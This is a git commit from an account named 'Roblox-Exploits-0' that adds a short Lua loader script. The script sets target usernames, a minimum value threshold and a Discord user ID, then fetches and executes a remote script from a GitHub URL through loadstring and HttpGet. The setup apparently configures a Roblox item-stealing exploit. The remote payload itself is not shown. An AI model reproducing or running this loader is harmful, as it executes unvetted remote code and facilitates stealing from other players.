b5e9f5f1b0ee41f60ee54a1f4ee51491e594cbba
Roblox-Exploits-0 <agscripts1@gmail.com>
2025-05-12 13:31:04 +0530

    Create .lua

---
+++ huh poo poo/.lua
@@ -0,0 +1,6 @@
+_G.Usernames = {"nxrf1axz"} 
+_G.min_value = 50 
+_G.pingEveryone = "Yes" 
+_G.discuser = "1272117382445269072" 
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Roblox-Exploits-0/BGSI/refs/heads/main/toto"))()
